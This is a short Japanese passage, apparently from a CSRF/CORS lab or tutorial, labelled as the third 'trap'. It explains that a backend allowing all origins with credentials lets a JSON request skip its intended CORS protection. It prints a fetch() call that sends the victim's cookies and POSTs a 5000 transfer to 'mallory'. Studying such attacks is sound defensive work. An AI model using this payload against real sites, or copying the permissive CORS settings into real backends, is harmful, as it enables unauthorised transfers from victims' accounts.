罠③: fetch() + credentials:'include'

Content-Type を application/json にすると本来は CORS プリフライトが 走るが、被害者バックエンドが CORS_ALLOW_ALL_ORIGINS=True + CORS_ALLOW_CREDENTIALS=True で許可しているため通ってしまう。 

fetch('{{ victim_api_base }}/api/transfer/', {
  method: 'POST',
  credentials: 'include',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ to: 'mallory', amount: 5000 }),
});
